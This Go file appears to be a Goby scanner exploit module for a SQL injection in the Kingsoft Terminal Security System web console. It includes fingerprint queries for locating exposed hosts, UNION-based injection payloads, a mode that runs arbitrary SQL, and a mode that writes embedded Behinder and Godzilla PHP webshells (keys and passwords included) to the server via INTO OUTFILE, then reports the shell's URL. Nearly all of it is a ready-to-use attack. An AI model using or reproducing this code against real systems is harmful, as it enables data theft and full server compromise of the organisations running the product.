package exploits

import (
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Kingsoft Terminal security system update_software_info_v2.php file SQL Injection Vulnerability",
    "Description": "<p>Kingsoft Terminal security system is a terminal security management platform specially designed for government, military, energy, education, medical and group enterprises.</p><p>The SQL injection vulnerability exists in the Web console of Kingsoft terminal security system. In addition to the SQL injection vulnerability, the attacker can obtain the information in the database (for example, the administrator's background password, the user's personal information of the site), and even write the Trojan horse to the server in the case of high permission to further obtain the server system permission.</p>",
    "Product": "kingsoft-TSS",
    "Homepage": "http://www.ejinshan.net/",
    "DisclosureDate": "2023-10-16",
    "PostTime": "2023-10-17",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "(body=\"iepngfix/iepngfix_tilebg.js\" && body=\"jquery/qtree/qtree.css\") || header=\"SKYLARa0aede9e785feabae789c6e03d\" || banner=\"SKYLARa0aede9e785feabae789c6e03d\"",
    "GobyQuery": "(body=\"iepngfix/iepngfix_tilebg.js\" && body=\"jquery/qtree/qtree.css\") || header=\"SKYLARa0aede9e785feabae789c6e03d\" || banner=\"SKYLARa0aede9e785feabae789c6e03d\"",
    "Level": "3",
    "Impact": "<p>The SQL injection vulnerability exists in the Web console of Kingsoft terminal security system. In addition to the SQL injection vulnerability, the attacker can obtain the information in the database (for example, the administrator's background password, the user's personal information of the site), and even write the Trojan horse to the server in the case of high permission to further obtain the server system permission.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.ejinshan.net/lywz/index\">https://www.ejinshan.net/lywz/index</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select user()",
            "show": "attackType=sql"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test98765X.txt",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "d49q8w7e",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "金山终端安全系统 update_software_info_v2.php 文件 SQL 注入漏洞",
            "Product": "猎鹰安全-金山终端安全系统",
            "Description": "<p>金山终端安全系统是专门为政府、军工、能源、教育、医疗及集团化企业设计的终端安全管理平台。<br></p><p>金山终端安全系统 Web 控制台存在 SQL 注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.ejinshan.net/lywz/index\" target=\"_blank\">https://www.ejinshan.net/lywz/index</a></p>",
            "Impact": "<p>金山终端安全系统 Web 控制台存在 SQL 注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Kingsoft Terminal security system update_software_info_v2.php file SQL Injection Vulnerability",
            "Product": "kingsoft-TSS",
            "Description": "<p>Kingsoft Terminal security system is a terminal security management platform specially designed for government, military, energy, education, medical and group enterprises.</p><p>The SQL injection vulnerability exists in the Web console of Kingsoft terminal security system. In addition to the SQL injection vulnerability, the attacker can obtain the information in the database (for example, the administrator's background password, the user's personal information of the site), and even write the Trojan horse to the server in the case of high permission to further obtain the server system permission.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.ejinshan.net/lywz/index\" target=\"_blank\">https://www.ejinshan.net/lywz/index</a></p>",
            "Impact": "<p>The SQL injection vulnerability exists in the Web console of Kingsoft terminal security system. In addition to the SQL injection vulnerability, the attacker can obtain the information in the database (for example, the administrator's background password, the user's personal information of the site), and even write the Trojan horse to the server in the case of high permission to further obtain the server system permission.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10851"
}`

	sendPayloadDWUI5894654EOH := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		postConfig := httpclient.NewPostRequestConfig("/inter/update_software_info_v2.php")
		postConfig.FollowRedirect = false
		postConfig.VerifyTls = false
		postConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		postConfig.Data = "type=" + sql + "&key=&pageCount=0&curPage="
		return httpclient.DoHttpRequest(hostInfo, postConfig)
	}

	checkFileExistDNQWOUQQDJWQIEH := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/" + filename)
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randomString := goutils.RandomHexString(5)
			resp, _ := sendPayloadDWUI5894654EOH(hostInfo, fmt.Sprintf("-100+UNION+SELECT+1,md5(\"%s\"),3,4,5,6,7,8--", randomString))
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, fmt.Sprintf("%x", md5.Sum([]byte(randomString))))
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "sql" {
				sqlQuery := goutils.B2S(stepLogs.Params["sql"])
				resp, err := sendPayloadDWUI5894654EOH(expResult.HostInfo, "-100+UNION+SELECT+NULL,("+url.QueryEscape(sqlQuery)+"),3,4,5,6,7,8--")
				if err != nil {
					expResult.Output = err.Error()
				} else if resp.StatusCode == 200 && len(regexp.MustCompile(`name":"(.*?)","`).FindStringSubmatch(resp.Utf8Html)) > 1 {
					expResult.Success = true
					expResult.Output = regexp.MustCompile(`name":"(.*?)","`).FindStringSubmatch(resp.Utf8Html)[1]
				}
			} else if attackType == "webshell" {
				webshell := goutils.B2S(stepLogs.Params["webshell"])
				filename := goutils.RandomHexString(5) + ".php"
				tool := ""
				password := ""
				var content string
				if webshell == "behinder" {
					tool = "Behinder v3.0"
					password = "rebeyond"
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION["k"]=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded("openssl")){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode("|",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "godzilla" {
					tool = "Godzilla v4.1"
					password = "pass 加密器：PHP_XOR_BASE64"
					content = `<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $pass="pass"; $payloadName="payload"; $key="3c6e0b8a9c15224a"; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,"getBasicsInfo")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,"getBasicsInfo")!==false){ $_SESSION[$payloadName]=encode($data,$key);}}}?>`
				} else if webshell == "custom" {
					content = goutils.B2S(stepLogs.Params["content"])
					filename = goutils.B2S(stepLogs.Params["filename"])
				} else {
					expResult.Success = false
					expResult.Output = "未知的利用方式"
					return expResult
				}
				content = strings.ReplaceAll(content, "'", "\\'")
				sqlPayload := "-100+UNION+SELECT+'" + url.QueryEscape(content) + "',NULL,NULL,NULL,NULL,NULL,NULL,NULL+into+outfile+'..\\\\..\\\\Console\\\\" + filename + "'--"
				_, err := sendPayloadDWUI5894654EOH(expResult.HostInfo, sqlPayload)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				resp, err := checkFileExistDNQWOUQQDJWQIEH(expResult.HostInfo, filename)
				if err == nil && resp.StatusCode == 200 {
					expResult.Success = true
					if webshell == "custom" {
						expResult.Output = "File URL: " + expResult.HostInfo.FixedHostInfo + "/" + filename
						return expResult
					}
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/" + filename + "\n"
					expResult.Output += "Password: " + password + "\n"
					expResult.Output += "WebShell tool: " + tool + "\n"
					expResult.Output += "Webshell type: php"
				}
				return expResult
			} else if attackType == "sqlPoint" {
				randomString := goutils.RandomHexString(5)
				resp, err := sendPayloadDWUI5894654EOH(expResult.HostInfo, fmt.Sprintf("-100+UNION+SELECT+1,md5(\"%s\"),3,4,5,6,7,8--", randomString))
				if err != nil {
					expResult.Output = err.Error()
				} else if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, fmt.Sprintf("%x", md5.Sum([]byte(randomString)))) {
					expResult.Success = true
					expResult.Output = `POST /inter/update_software_info_v2.php HTTP/1.1
Host: ` + expResult.HostInfo.FixedHostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 77
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

type=-100+UNION+SELECT+NULL,md5("123"),3,4,5,6,7,8--&key=&pageCount=0&curPage=`
				}
			}
			return expResult
		},
	))
}
